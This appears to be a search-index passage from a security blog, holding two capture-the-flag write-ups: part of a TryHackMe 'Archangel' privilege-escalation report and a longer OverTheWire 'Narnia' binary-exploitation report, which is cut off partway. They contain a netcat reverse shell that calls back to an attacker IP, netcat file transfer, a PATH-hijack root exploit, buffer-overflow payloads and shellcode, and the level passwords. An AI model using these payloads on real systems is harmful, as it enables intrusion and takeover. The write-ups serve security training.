crontab  system wide crontab  Unlike any other crontab you don t have to run the  crontab   command to install the new version when you edit this file  and files in  etc cron d  These files also have username fields   that none of the other crontabs doSHELL  bin shPATH  usr local sbin  usr local bin  sbin  bin  usr sbin  usr binm h dom mon dow user  command  1             archangel  opt helloworld sh17              root    cd      run parts   report  etc cron hourly25 6            root    test  x  usr sbin anacron      cd      run parts   report  etc cron daily  47 6        7   root    test  x  usr sbin anacron      cd      run parts   report  etc cron weekly  52 6    1       root    test  x  usr sbin anacron      cd      run parts   report  etc cron monthlyendhighlightTherefore  we can append a reverse shell on the file and listen on the specified porthighlight bash www data ubuntu  opt  cat helloworld sh   bin bashecho  hello world      opt backupfiles helloworld txtrm  tmp f mkfifo  tmp f cat  tmp f  bin sh  i 2  1 nc 10 2 29 238 9002   tmp f   endhighlightEventually  the cronjob runs and we get a shell as the archangel userhighlight bash    0xd4y Writeup     business tryhackme easy linux archangel       nc  lvnp 9002listening on  any  9002    connect to  10 2 29 238  from  UNKNOWN   10 10 72 16  47742 bin sh  0  can t access tty  job control turned off  whoamiarchangel   endhighlightRoot Privilege EscalationAs the archangel user  we now have access to the myfiles directory located in the compromised user s home directoryBinary ExploitationWithin this directory lies a  backup  file with SETUID root permissions  Upon executing this file  we can see that the binary is calling the cp commandarchangel ubuntu   secret    backupcp  cannot stat   home user archangel myfiles     No such file or directoryWe can download this file using netcat to further analyze this binary on our attack box with Ghidra  3    ftnt3highlight bash archangel ubuntu   secret  nc  w3 10 2 29 238 9001   backup0xd4y Writeup     business tryhackme easy linux archangel       nc  lvnp 9001   backuplistening on  any  9001    connect to  10 2 29 238  from  UNKNOWN   10 10 72 16  42682   0xd4y Writeup     business tryhackme easy linux archangel       lsbackup  lfi  nmap  notes txt   endhighlight Reverse EngineeringGhidra converts assembly code into C code  It finds that this file is relatively small with only a couple lines of codehighlight c undefined8 main voidsetuid 0   setgid 0   system  cp  home user archangel myfiles    opt backupfiles    return 0endhighlightAs can be seen  the binary is calling the cp command without using a full path Command InjectionThus  we can exploit this vulnerability by creating a file called cp and modifying our PATH environment variable to prioritize the location of this malicious file  4    ftnt4highlight bash archangel ubuntu   secret  cat cp bin basharchangel ubuntu   secret  chmod  x cparchangel ubuntu   secret  echo  PATH usr local sbin  usr local bin  sbin  bin  usr sbin  usr binarchangel ubuntu   secret  export PATH    PATHarchangel ubuntu   secret  lsbackup  cp  user2 txt   endhighlightNow when we execute the backup binary  it will run our malicious file instead of the intended commandhighlight bash archangel ubuntu   secret    backuproot ubuntu   secret  iduid 0 root  gid 0 root  groups 0 root  1001 archangel    endhighlightConclusionThe client is running a vulnerable http service that is at risk of being exploited  A malicious attacker can achieve full root access on this system without trouble  This system must be patched as soon as possible  and the following remediations will provide a stronger defense against possible attacksModify the test php script on the development site to not include user inputted filesThe script can be modified to only whitelist certain file namesFailure to correctly include files resulted in a critical RCE vulnerabilityBe mindful of misconfigurations within the local systemThe www data user was able to modify a critical cronjob run as the archangel user  which allowed for horizontal privilege escalationAlways use full paths when performing any action as a privileged userDue to the improper use of a command in a binary running as root  we were able to escalate privileges to the root user through modifying the PATH environment variableIt is highly encouraged that the system be patched as soon as possible with the aforementioned remediations1    ftnt ref1   https   outpost24 com blog from local file inclusion to remote code execution part 1  https   www google com url q https   outpost24 com blog from local file inclusion to remote code execution part 1 sa D source editors ust 1653795832279006 usg AOvVaw0vYqPLqqpfLH1no AIDnyO2    ftnt ref2   https   github com 0xd4y RevShell  https   www google com url q https   github com 0xd4y RevShell sa D source editors ust 1653795832279311 usg AOvVaw1Nq uwG2S7SbKUK87iQimZ3    ftnt ref3   https   github com NationalSecurityAgency ghidra  https   www google com url q https   github com NationalSecurityAgency ghidra sa D source editors ust 1653795832279536 usg AOvVaw0poo jDK2AMc 8bKRwapo34    ftnt ref4   https   owasp org www community attacks Command Injection  https   www google com url q https   owasp org www community attacks Command Injection sa D source editors ust 1653795832279759 usg AOvVaw1S6mvU5d9Uujc94ekfUZTm",
      "image": "/images/archangel.png"
    } ,
  
    {
      "title"    : "Narnia Writeup",
      "category" : "",
      "tags"     : "",
      "url"      : "/2021/04/22/Narnia-Writeup/",
      "date"     : "Apr 22, 2021",
      "content"  : "layout  posttitle   Narnia Writeupdescription  This challenge was about binary exploitation  There were a total of nine binaries which increased in difficulty after each exploit  Common binary exploitation techniques are discussed in this report including ret2libc  shellcode injection  format string exploitation  among others date    2021 04 22 image     images 0xd4y logo gray png tags     Binary Exploitation  Ret2Libc  Shellcode  Format StringThis report can be read both on this site  and as its  a href    https   0xd4y.com reports Narnia 20Writeup pdf  original report form  a   It is highly recommended that you read the original report form instead because it is better formattedNarniaAn analysis on the exploitation of vulnerable binaries    images 0xd4y logo gray png 0xd4yApril 22  20210xd4y WriteupsLinkedIn   https   www linkedin com in segev eliezer   https   www google com url q https   www linkedin com in segev eliezer  sa D source editors ust 1653862984558652 usg AOvVaw1JksxnKhCZdIQLLPjaAdeiEmail   0xd4yWriteups gmail com  mailto 0xd4yWriteups gmail comWeb   https   0xd4y.com   https   www google com url q https   0xd4y.com Writeups  sa D source editors ust 1653862984559588 usg AOvVaw0r9GLF72jsSxJddztkdbfSTable of ContentsExecutive Summary   h ip86uerwz5x0          3   h ip86uerwz5x0Attack Narrative   h 1v4pnj65xmth          4   h 1v4pnj65xmthNarnia 0   h es2smgb3v3t5          4   h es2smgb3v3t5Binary Analysis   h aua361lc1ay          4   h aua361lc1ayBuffer Overflow   h hjua9cypbazu          5   h hjua9cypbazuSource Code   h faqz5avaj4l1          7   h faqz5avaj4l1Narnia 1   h 8oz60692a7cl          8   h 8oz60692a7clBinary Analysis   h lt9yn9n3bj0q          8   h lt9yn9n3bj0qExporting Shellcode into the Environment Variable   h f521hvia84ja          9   h f521hvia84jaSource Code   h z2yo1owiuxq5          10   h z2yo1owiuxq5Narnia 2   h e4mp3rcoeyar          11   h e4mp3rcoeyarBinary Analysis   h y4f2ngky9lgd          12   h y4f2ngky9lgdCalculating EIP Offset   h p5qp0v2f6sef          13   h p5qp0v2f6sefHow the Buffer Relates to the Stack   h 6f0mxmx57b85          14   h 6f0mxmx57b85Constructing a Payload   h 9gl2y6eg1cdw          16   h 9gl2y6eg1cdwBinary Exploitation   h jqrye1p9mibs          17   h jqrye1p9mibsPOC   h ifkxhsp30btt          17   h ifkxhsp30bttExploiting the Binary on the Target   h btcg0ydv7z1y          18   h btcg0ydv7z1ySource Code   h f5q3c5hy51ko          20   h f5q3c5hy51koNarnia 3   h ya2tytmk5a6          21   h ya2tytmk5a6Attempting to Read Passwords from the Stack Pointer   h 9bmlxskadml          21   h 9bmlxskadmlSecurity Behind SUID Debugging   h uwcd8r4kpbx9          23   h uwcd8r4kpbx9Binary Analysis   h j60l4ds1ohcj          23   h j60l4ds1ohcjExploiting strcpy   h koxo6w7ztt2h          25   h koxo6w7ztt2hSource Code   h 65h64uhj8erp          27   h 65h64uhj8erpNarnia 4   h 125dslwuwfyp          28   h 125dslwuwfypBinary Analysis   h yp19zv417s7          28   h yp19zv417s7Binary Exploitation   h cupgylaegp6p          29   h cupgylaegp6pSource Code   h q1ltbnf2eoc8          32   h q1ltbnf2eoc8Narnia 5   h n6g8yeh9n8qz          33   h n6g8yeh9n8qzBinary Analysis   h p5cduqaaxxju          33   h p5cduqaaxxjuFormat String Exploit   h or0vns1b426t          35   h or0vns1b426tPOC   h 1d69hbczxii5          35   h 1d69hbczxii5Controlling Variable Value   h yykxe27qf77w          36   h yykxe27qf77wMethod 1   h tfreh8cbxghu          36   h tfreh8cbxghuMethod 2   h 1dxm4wj8e7ar          37   h 1dxm4wj8e7arSource Code   h bro9vn3stiqu          37   h bro9vn3stiquNarnia 6   h 2kucwybj5f6g          38   h 2kucwybj5f6gBinary Analysis   h 8051n9d3n5mc          38   h 8051n9d3n5mcBehavior   h k1z5nw3t7i3p          38   h k1z5nw3t7i3pGhidra   h dpcv8d85ball          38   h dpcv8d85ballRet2libc Attack   h dvw7b326b9wv          40   h dvw7b326b9wvPOC   h dvmc1o6n9rdl          40   h dvmc1o6n9rdlDetermining System Address   h 3qizfr8tqpd0          41   h 3qizfr8tqpd0Exploit   h j51clcuxsbhy          43   h j51clcuxsbhySource Code   h kz3mi2kchbqk          44   h kz3mi2kchbqkNarnia 7   h v80flpijk1ef          45   h v80flpijk1efBinary Analysis   h ig8xq2hea5tr          45   h ig8xq2hea5trBehavior   h h2wztyt0doyp          45   h h2wztyt0doypGhidra   h ljfvw3fuhsaq          46   h ljfvw3fuhsaqFormat String Exploit   h j683xnn6p9mj          46   h j683xnn6p9mjSource Code   h kisnd3uzx3yn          47   h kisnd3uzx3ynNarnia 8   h 2cvhcmtmn70t          49   h 2cvhcmtmn70tBinary Analysis   h v7t5s7tgs2x2          49   h v7t5s7tgs2x2Ghidra   h wb361gqlsxjo          49   h wb361gqlsxjoBuffer Overflow   h ihr6gj74lno1          51   h ihr6gj74lno1Gdb   h closiciqkdn5          51   h closiciqkdn5Local 8 Address Behavior   h 9w58qw4azn9y          53   h 9w58qw4azn9yOverwriting func Return Address   h j10h1qzdlbsf          54   h j10h1qzdlbsfShellcode   h 7l78l8n3eh28          56   h 7l78l8n3eh28Source Code   h kxnobi7dhgec          57   h kxnobi7dhgecConclusion   h susjdnco5e24          58   h susjdnco5e24Executive SummaryThe source code of each program was given  however throughout this report each program will be treated as if we are not given this information  This approach is taken so as to replicate real world environments in which an attacker most likely would not have knowledge on the source code of the binary he or she is trying to exploitThis penetration test resulted in the successful exploitation of all nine out of nine binaries  Among the vulnerabilities were the following  passing unsanitized input into functions  failure to check boundaries  using insecure functions  and unnecessarily disabling the NX bit  Remediations are outlined in the  Conclusion   h susjdnco5e24  section where specific vulnerabilities were described more in detail  All users except root were compromised  and the password for each compromised user was retrievedUsernamePasswordnarnia0narnia0narnia1efeidiedaenarnia2nairiepecunarnia3vaequeezeenarnia4thaenohtainarnia5faimahchiynarnia6neezocaengnarnia7ahkiaziphunarnia8mohthuphognarnia9eiL5fealaeAttack NarrativeEach binary gets increasingly harder  For every challenge  I have downloaded each binary by copying its base64 or base32 data on my attacking box  This was done to allow a further analysis into the binary by allowing the usage of pwndbg  1    ftnt1   Ghidra  2    ftnt2   and other tools that are not present on the target machineNarnia 0We are given the credentials for the narnia0 user  and with it we can ssh into the boxBinary AnalysisBefore trying to exploit the first binary by testing buffer overflows  we will check the security of the binary with the checksec command reports Narnia image7 png The  Arch  row shows that this binary is a 32 bit program and whose endianness is little endian  Additionally  we can see that NX  non execute   the bit responsible for not allowing writable memories to be executed  is enabled  This means that we cannot inject shellcode into the function  We can get a little more information about the binary by using the file commandhighlight bash    0xd4y Writeup     business other overthewire narnia       file narnia0 narnia0  ELF 32 bit LSB executable  Intel 80386  version 1  SYSV   dynamically linked  interpreter  lib ld linux so 2  for GNU Linux 2 6 32  BuildID sha1  0840ec7ce39e76ebcecabacb3dffb455cfa401e9  not stripped   endhighlightNote how this file is not stripped which means it will contain debug information regarding symbols and functions  This will give us a little bit more information as to what is going on with the binary when we try to reverse engineer itRunning the program  we can see that it is asking for a certain value in the function to be changedhighlight bash narnia0 narnia  narnia    narnia0Correct val s value from 0x41414141    0xdeadbeef Here is your chance  testbuf  testval  0x41414141WAY OFF     endhighlightAttempting to write the four letter word  test  to the buffer proves to be an inadequate length for overflowing the buffer as the value did not changeBuffer OverflowWe can verify that this value can be modified by attempting to flood the buffer with a long string of charactershighlight bash    0xd4y Writeup     business other overthewire narnia       pwn cyclic 100aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaanarnia0 narnia  narnia    narnia0Correct val s value from 0x41414141    0xdeadbeef Here is your chance  aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaabuf  aaaabaaacaaadaaaeaaafaaaval  0x61616166WAY OFF     endhighlightObserve that the value has changed from 0x41414141 to 0x61616166 confirming that there is a buffer overflow vulnerability  To calculate the offset  the  l flag can be utilized in the pwn commandhighlight bash    0xd4y Writeup     business other overthewire narnia       pwn cyclic  l 0x6161616620   endhighlightSeeing as the offset is 20 bytes  it is possible to input up to 20 bytes into the buffer before the value gets changed  Thus the payload will incorporate a string of 20 bytes followed by 0xdeadbeef in little endian which is xefxbexadxde  Conducting this attack reveals the followinghighlight bash narnia0 narnia  narnia  python  c  print  A  20  xefxbexadxde     narnia0 Correct val s value from 0x41414141    0xdeadbeef Here is your chance  buf  AAAAAAAAAAAAAAAAAAAA val  0xdeadbeefThe attack has been successfully performed as can be seen from the overwritten value and lack of the WAY OFF     message  However  no shell was given  Analysing this program in radare2 reveals that we should be getting a  bin sh shell    endhighlight reports Narnia image1 png Upon further thought into the reason for not receiving a shell  it came to mind that perhaps the shell is dying with the process of piping the python command into the narnia0 binary  It is possible that stdin is attached to this process and therefore the shell immediately dies  Appening  cat   to the end of the command proves to work  this is because cat   outputs stdinhighlight bash narnia0 narnia  narnia   python  c  print  A  20  xefxbexadxde   cat      narnia0 Correct val s value from 0x41414141    0xdeadbeef Here is your chance  buf  AAAAAAAAAAAAAAAAAAAA val  0xdeadbeefwhoaminarnia1cat  etc narnia pass narnia1efeidiedae   endhighlightCommands are successfully being executed inside the  bin sh shellLooking at the source code of the program  we can confirm that the aforementioned analysis of the binary was correcthighlight c  include  stdio h  include  stdlib hint main      long val 0x41414141    char buf 20     printf  Correct val s value from 0x41414141    0xdeadbeef n      printf  Here is your chance        scanf   24s   buf     printf  buf   sn  buf     printf  val  0x 08xn  val     if val  0xdeadbeef         setreuid geteuid   geteuid           system   bin sh          else         printf  WAY OFF    n          exit 1         return 0endhighlighthighlight c     Source Codeinclude  stdio h  include  stdlib hint main      long val 0x41414141    char buf 20     printf  Correct val s value from 0x41414141    0xdeadbeef n      printf  Here is your chance        scanf   24s   buf     printf  buf   sn  buf     printf  val  0x 08xn  val     if val  0xdeadbeef         setreuid geteuid   geteuid           system   bin sh          else         printf  WAY OFF    n          exit 1         return 0endhighlightNarnia 1Now with a shell as the narnia1 user  we have the necessary permissions to execute the next binaryhighlight bash narnia1 narnia  narnia    narnia1Give me something to execute at the env variable EGG   endhighlightWe can see that the binary is expecting an environment variable called EGG  The program states that it will execute this environment variable  hinting at the fact that this binary may be vulnerable to an environment variable buffer overflow  3    ftnt3   Before attempting a buffer overflow  we can provide a simple string to the EGG environment variable to see how the binary is meant to behavehighlight bash narnia1 narnia  narnia  export EGG 1                                                                                                                                        narnia1 narnia  narnia    narnia1                                                                                                                                            Trying to execute EGG                                                                                                                                                       Segmentation fault                                                                                                                                                           endhighlightBinary AnalysisAfter only providing one byte  the program experienced a segmentation fault  To further understand how this binary works  a long string of A s can be exported to determine where the content of the environment variable is in the buffer  this was performed locally so as to have the ability to analyze with pwndbghighlight bash    0xd4y Writeup     business other overthewire narnia 1                                   gdb   narnia1  q                                                                pwndbg  loaded 196 commands  Type pwndbg  filter  for a list                         pwndbg  created  rebase   ida gdb functions  can be used with print break             Reading symbols from   narnia1                                                        No debugging symbols found in   narnia1                                             pwndbg  r                                                                            Starting program   home 0xd4y business other overthewire narnia 1 narnia1            Trying to execute EGGProgram received signal SIGSEGV  Segmentation fault                                   0xffffddf3 in                                                                         endhighlightWe get a segmentation fault as expected  however the EIP register is not getting overwritten  an address of 0x41414141  was expected  but instead it is 0xffffddf3   It is possible that the program is using the getenv   function  4    ftnt4  without storing the environment variable in a bufferExporting Shellcode into the Environment VariableAs can be seen from the segmentation fault error  the program is failing to validate the size and   or content of the environment variable  The program earlier stated that it will execute whatever is inside the EGG environment variable  The checksec command can be used to determine if the binary could execute shellcode reports Narnia image14 png Seeing as NX is disabled  the program might execute shellcode upon exporting shellcode to the EGG environment variableThere are many different shellcodes to use  but for the purpose of this exercise I chose the  bin sh shellcode from  here  https   www google com url q http   shell storm org shellcode files shellcode 827 php sa D source editors ust 1653862984600276 usg AOvVaw3mvMKazajKlAB6SL TGEYe   5    ftnt5   However  exporting this shellcode into the EGG environment variable and executing the program proves to not workhighlight bash narnia1 narnia  narnia  export EGG   python  c  print  x31xc0x50x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x50x53x89xe1xb0x0bxcdx80                       narnia1 narnia  narnia  echo  EGG1Ph  shh binPSnarnia1 narnia  narnia    narnia1Trying to execute EGG                 Segmentation fault                   endhighlightI do not know why this particular shellcode does not work  However  trying a shellcode  6    ftnt6  that executes  bin bash does workhighlight bash narnia1 narnia  narnia  export EGG   python  c  print  x6ax0bx58x99x52x66x68x2dx70x89xe1x52x6ax68x68x2fx62x61x73x68x2fx62x69x6ex89xe3x52x51x53x89xe1xcdx80   narnia1 narnia  narnia    narnia1Trying to execute EGG bash 4 4  whoaminarnia2bash 4 4  cat  etc narnia pass narnia2nairiepecu   endhighlightSource Codehighlight c  include  stdio hint main      int   ret       if getenv  EGG    NULL         printf  Give me something to execute at the env variable EGGn          exit 1         printf  Trying to execute EGG n      ret   getenv  EGG      ret      return 0endhighlightNote how the ret variable is not assigned a buffer  This is why the content of the environment variable was not seen in the ESP register during the analysis in pwndbgNarnia 2Using the credentials obtained for the narnia2 user  we can execute the narnia2 binaryhighlight bash narnia2 narnia  narnia    narnia2Usage    narnia2 argumentnarnia2 narnia  narnia    narnia2 AAnarnia2 narnia  narnia    endhighlightLooking at the usage of the program  we see that it expects an argument  Inputting an argument of  A  just makes the program print out the same character  In essence  the program spits out whatever we put in  As usual  we will analyze the binary on a local attack box to understand it better reports Narnia image8 png This is a 32 bit binary  It is not stripped which means the debug symbols will still be present within the binary  Furthermore  NX is disabled so we might be able to inject shellcode into the buffer and have the binary execute it  To detect a buffer overflow vulnerability  a large string of bytes were sent reports Narnia image12 png Binary AnalysisWe can see that the program errors out with a  Segmentation fault  error  It is essential to investigate further into what might be happening by using a debugger program such as gdb  There are other great debugger programs such as radare2  IDA  Ghidra  among many others  and each one of them has their strengths and weaknesses  gdb and radare2 tend to be very strong dynamic analysis debugger programs  while Ghidra and IDA are more useful for static analysishighlight bash pwndbg  r   python2  c  print  A  1000                                                                                                                              Starting program   home 0xd4y business other overthewire narnia 2 narnia2   python2  c  print  A  1000Program received signal SIGSEGV  Segmentation fault                                   0x41414141 in                                                                                                                                                                LEGEND  STACK   HEAP   CODE   DATA   RWX   RODATA                                                                          REGISTERS                                       EAX  0x0                                                                             EBX  0x0                                                                                                                                                                   ECX  0x0                                                                                                                                                                   EDX  0x0EDI  0xf7fa6000   GLOBAL OFFSET TABLE       insb   byte ptr es  edi   dx    0x1e4d6c   ESI  0xf7fa6000   GLOBAL OFFSET TABLE       insb   byte ptr es  edi   dx    0x1e4d6c   EBP  0x41414141   AAAA  ESP  0xffffcc60     0x41414141   AAAA  EIP  0x41414141   AAAA                                                                                     DISASM                                                                                    Invalid address 0x41414141   endhighlight Calculating EIP OffsetAfter running the program in gdb and providing 1000 A s as the argument  the EIP register was successfully overwritten to 0x41414141  To find the offset  the cyclic function can be used as followshighlight bash pwndbg  r   cyclic 1000                                                                                                                                               11 205 Starting program   home 0xd4y business other overthewire narnia 2 narnia2   cyclic 1000Program received signal SIGSEGV  Segmentation fault 0x62616169 in      LEGEND  STACK   HEAP   CODE   DATA   RWX   RODATA                                      REGISTERS                                       EAX  0x0       EBX  0x0       ECX  0x0       EDX  0x0       EDI  0xf7fa6000   GLOBAL OFFSET TABLE       insb   byte ptr es  edi   dx    0x1e4d6c                                                                                         ESI  0xf7fa6000   GLOBAL OFFSET TABLE       insb   byte ptr es  edi   dx    0x1e4d6c   EBP  0x62616168   haab  ESP  0xffffcc60     0x6261616a   jaab  EIP  0x62616169   iaab                                                                                     DISASM                                                                                    Invalid address 0x62616169   endhighlightObserve that the EIP register has changed in value causing the instruction pointer to return to an unexpected address and crashSeeing that the EIP register is now 0x62616169  the offset can now be calculated with the  l flaghighlight bash pwndbg  cyclic  l 0x62616169132   endhighlightThus  132 bytes can be passed before overwriting the EIP register  We can view what is inside the stack by accessing the ESP register  This register is responsible for pointing to the top of the stack  How the Buffer Relates to the StackThe buffer is where data is temporarily stored  and it is located in the RAM  random access memory  of the computer  When there is improper validation as to the content and size of the buffer  the program can experience an overflow in which inputted data floods the memory of the program reports Narnia image2 png   7    ftnt7  A visual image of how a buffer overflow attack can overwrite memoryAs more data gets inputted into the buffer  the stored data of the program  located in the stack  gets overwritten in the following order1   Local variables2   Saved registers3   Return address4   Function arguments  parameters reports Narnia image4 png   8    ftnt8  A simplified image on how the buffer relates to the stackWhen a program allocates a fixed number of bytes into the buffer  the memory of the buffer will end up spilling into the EBP  base pointer   ESP  stack pointer   and EIP  instruction pointer  registers  The EIP register will hold the return address  while the ESP register contains the data of the program  The EBP register is typically reserved as a backup for the ESP in case the ESP is modified during execution of a function  note that the EBP register can be overflowed as wellConstructing a PayloadNow with the knowledge of the EIP offset  132 bytes   we can construct a payload that will look like the followingJUNK BYTE   132   ADDRESS TO SHELLCODE   NOP SLED   SHELLCODEIn regards to the payload  it is important to emphasize what is the purpose of a NOP sled and what it is  A NOP sled is a series of NOP  no operation  bytes  which is an instruction that occupies space in memory  but tells the program to not do anything  The purpose of a NOP sled in binary exploitation is to allow a greater leniency when determining the proper address to flood the EIP register with  When the shellcode is put after the NOP sled and the instruction pointer is pointing to somewhere within the bounds of the NOP sled  the program will essentially go through each NOP instruction until it executes the shellcodeBinary Exploitation POCBefore the attack was conducted on the target machine  the payload was first executed on the attacking box so as to get a better view as to how to correctly format the payload using pwndbghighlight bash pwndbg  r   python  c  print  A  132   B  4   x90  30   x31xc0x50x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x50x53x89xe1xb0x0bxcdx80           Starting program   home 0xd4y business other overthewire narnia 2 narnia2   python  c  print  A  132   B  4   x90  30   x31xc0x50x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x50x53x89xe1xb0x0bxcdx80Program received signal SIGSEGV  Segmentation fault                                                                                                                          0x42424242 in                                                                                                                                                                 endhighlightNote how the EIP register was successfully overwritten with 4 B sAfter executing this payload  we can view where in the EBP register lies the payloadhighlight bash pwndbg  x 100x  esp 200                                                                                                                                                     0xffffcec8      0xffffdf8b      0x00000000      0xf7fa6000      0xf7fa6000                                                                                                  0xffffced8      0xffffcf88      0xf7e14fe5      0xf7fa6d20      0x08048534                                                                                                   0xffffcee8      0xffffcf04      0x00000000      0xffffcf08      0xf7ffd980            0xffffcef8      0xf7e14fc5      0x08048494      0x08048534      0xffffcf08                                                                                                   0xffffcf08      0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffcf18      0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffcf28      0x41414141      0x41414141      0x41414141      0x414141410xffffcf38      0x41414141      0x41414141      0x41414141      0x414141410xffffcf48      0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffcf58      0x41414141      0x41414141      0x41414141      0x414141410xffffcf68      0x41414141      0x41414141      0x41414141      0x414141410xffffcf78      0x41414141      0x41414141      0x41414141      0x414141410xffffcf88      0x41414141      0x42424242      0x90909090      0x909090900xffffcf98      0x90909090      0x90909090      0x90909090      0x909090900xffffcfa8      0x90909090      0xc0319090      0x2f2f6850      0x2f6868730xffffcfb8      0x896e6962      0x895350e3      0xcd0bb0e1      0x000000800xffffcfc8      0xf7fa6000      0xf7fa6000      0x00000000      0x6675dc09   endhighlightAs we can see  the junk bytes lead all the way to 0xffffcf88  and the return address starts at 0xffffcf88   4 which is 0xffffcf8c  The NOP sled then begins at 0xffffcf90  and the shellcode starts at 0xffffcfac  Using this information  we can construct the payload to be the followinghighlight bash python  c  print  A  132   x98xcfxffxff     x90  30    x31xc0x50x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x50x53x89xe1xb0x0bxcdx80   endhighlightThe return address points to 0xffffcf98 which is an address within the boundary of the NOP sled  Therefore  this payload should go past each NOP bytes as it eventually gets to the shellcodehighlight bash pwndbg  r   python  c  print  A  132   x98xcfxffxff   x90  30   x31xc0x50x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x50x53x89xe1xb0x0bxcdx80           Starting program   home 0xd4y business other overthewire narnia 2 narnia2   python  c  print  A  132   x98xcfxffxff   x90  30   x31xc0x50x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x50x53x89xe1xb0x0bxcdx80   process 5966 is executing new program   usr bin dash  whoami Attaching after process 5966 fork to child process 5974  New inferior 2  process 5974   Detaching after fork from parent process 5966  Inferior 1  process 5966  detached process 5974 is executing new program   usr bin whoami0xd4y   endhighlightSeeing as the program successfully executed the shellcode  we can now try this same payload   with the modification of the return address  on the target machine Exploiting the Binary on the TargetAfter logging into the narnia2 user and running the same payload within gdb we see the followinghighlight bash narnia2 narnia  narnia  gdb   narnia2  q                                                                                                                              37 634 Reading symbols from   narnia2    no debugging symbols found    done  gdb  r   python  c  print  A  132   x98xcfxffxff   x90  30   x31xc0x50x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x50x53x89xe1xb0x0bxcdx80             Starting program   narnia narnia2   python  c  print  A  132   x98xcfxffxff   x90  30   x31xc0x50x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x50x53x89xe1xb0x0bxcdx80Program received signal SIGSEGV  Segmentation fault 0xffffcf98 in       gdb  x 100x  esp 2000xffffd448      0xf7e53f7b      0x00000000      0x00000002      0xf7fc50000xffffd458      0xffffd508      0xf7e5b7f6      0xf7fc5d60      0x080485340xffffd468      0xffffd488      0xf7e5b7d0      0xffffd488      0xf7ffd9200xffffd478      0xf7e5b7d5      0x08048494      0x08048534      0xffffd4880xffffd488      0x41414141      0x41414141      0x41414141      0x414141410xffffd498      0x41414141      0x41414141      0x41414141      0x414141410xffffd4a8      0x41414141      0x41414141      0x41414141      0x414141410xffffd4b8      0x41414141      0x41414141      0x41414141      0x414141410xffffd4c8      0x41414141      0x41414141      0x41414141      0x414141410xffffd4d8      0x41414141      0x41414141      0x41414141      0x414141410xffffd4e8      0x41414141      0x41414141      0x41414141      0x414141410xffffd4f8      0x41414141      0x41414141      0x41414141      0x414141410xffffd508      0x41414141      0xffffcf98      0x90909090      0x909090900xffffd518      0x90909090      0x90909090      0x90909090      0x909090900xffffd528      0x90909090      0xc0319090      0x2f2f6850      0x2f6868730xffffd538      0x896e6962      0x895350e3      0xcd0bb0e1      0xfe7900800xffffd548      0xc497b545      0x00000000      0x00000000      0x00000000   endhighlightHere we can see that the junk bytes end at 0xffffd508 and the EIP register is overwritten at 0xffffd50C  The nop sled then begins at 0xffffd510 and the shellcode starts at 0xffffd52c  Therefore  we can modify the payload to point to 0xffffd518 which is within the bounds of the NOP sled and the shellcode will get executedhighlight bash narnia2 narnia  narnia    narnia2   python  c  print  A  132   x18xd5xffxff   x90  30   x31xc0x50x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x50x53x89xe1xb0x0bxcdx80   Illegal instruction   endhighlightUnfortunately  this payload did not work most likely due to a small shift in the memory address  It is important to note the fact that  Illegal instruction  was outputted instead of  Segmentation fault  which is a strong indicator that the payload is close to successful execution  It is the result of the overwritten EIP register pointing to an address with meaningless assembly code  After tweaking the address a little bit  changing x18xd5xffxff to x48xd5xffxff  we get a shell as narnia3highlight bash narnia2 narnia  narnia    narnia2   python  c  print  A  132   x48xd5xffxff   x90  30   x31xc0x50x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x50x53x89xe1xb0x0bxcdx80     whoaminarnia3cat  etc narnia pass narnia3vaequeezee   endhighlightSource Codehighlight c  include  stdio h  include  string h  include  stdlib hint main int argc  char   argv       char buf 128     if argc    1         printf  Usage   s argumentn   argv 0          exit 1         strcpy buf argv 1      printf   s   buf     return 0endhighlightWe can see that this program is vulnerable  as it only expects to receive up to 128 bytes for the buffer  and does not properly check the size of the user s inputNarnia 3Executing the narnia3 binary we see the followinghighlight bash narnia3 narnia  narnia    narnia3usage    narnia3 file  will send contents of file 2  dev nullEssentially  the program claims that it will read the contents of a file and write its contents to  dev null    endhighlightAttempting to Read Passwords from the Stack PointerThis means that the contents of the file it is reading from will most likely be in the esp register upon reading  We can verify this by first running the program in gdb and setting a breakpoint at the instruction right before the program terminateshighlight bash    0x08048602   247     pushl   0x4  ebp                                               0x08048605   250     call   0x80483f0  close plt                         0x0804860a   255     add     0x4  esp  0x0804860d   258     push    0x1  0x0804860f   260     call   0x80483b0  exit plt End of assembler dump  gdb  b  0x0804860d                        Breakpoint 1 at 0x804860d   endhighlightTo determine where the contents of the inputted file will be located  the file a txt was created  located in  tmp test6   whose contents is filled with 300 A shighlight bash  gdb  r  tmp test6 a txt                                                              Starting program   narnia narnia3  tmp test6 a txt                        copied contents of  tmp test6 a txt to a safer place      dev nullBreakpoint 1  0x0804860d in mainViewing the esp register reveals that this string of A s starts at 0xffffd560gdb  x 100x  esp 100                                                                                                                                              0xffffd4fc      0xf7fe818a      0xf7ffda7c      0xf7ffd000      0x0804825c            0xffffd50c      0xf7ffd000      0x0804825c      0x00000001      0xf7e187b8            0xffffd51c      0xf7e53f7b      0xf7e1d068      0x00000002      0xf7fc50000xffffd52c      0xf7fe800b      0x00000000      0x00000002      0xf7fc5000            0xffffd53c      0xffffd5b8      0xf7fee710      0xf7fc6870      0xffffd5b8            0xffffd54c      0x00000000      0x7fffffbd      0xf7ee930c      0x0804860a0xffffd55c      0x00000003      0x41414141      0x41414141      0x41414141            0xffffd56c      0x41414141      0x41414141      0x41414141      0x41414141            0xffffd57c      0x00414141      0x706d742f      0x7365742f      0x612f3674             endhighlightTherefore  when the  etc narnia pass narnia3 file is inputted  we can expect the contents of the file to be around 0xffffd560highlight bash  gdb  r  etc narnia pass narnia3The program being debugged has been started alreadyStart it from the beginning   y or n  yStarting program   